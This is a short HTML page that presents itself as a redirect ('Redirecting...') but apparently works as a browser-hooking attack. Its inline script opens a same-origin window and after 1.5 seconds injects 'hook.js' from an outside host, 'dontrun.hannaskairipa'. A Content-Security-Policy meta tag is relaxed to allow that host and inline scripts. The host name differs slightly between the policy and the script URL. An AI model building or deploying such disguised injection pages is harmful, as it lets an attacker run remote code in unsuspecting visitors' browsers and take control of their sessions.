<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirect</title>
  <!-- Allow inline scripts and external script from dontrun.hannaskairipa -->
  <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' http://dontrun.hannaskairipa.com  https://static.cloudflareinsights.com;">
</head>
<body>
  <h1>Redirecting...</h1>
  <p>If nothing happens, click <a id="go" href="#">here</a>.</p>

  <script>
    const url = "/"; // Same origin
    const scriptToInject = "http://dontrun.hannaskairipa/hook.js";

    const win = window.open(url, "_blank");

    // Try to inject script after 1.5 seconds
    setTimeout(() => {
      try {
        const s = win.document.createElement("script");
        s.src = scriptToInject;
        win.document.body.appendChild(s);
        console.log("Script injected!");
      } catch (e) {
        console.warn("Injection blocked by browser CSP or cross-origin policy.");
      }
    }, 1500);

    document.getElementById("go").onclick = () => {
      location.reload();
    };
  </script>
</body>
</html>
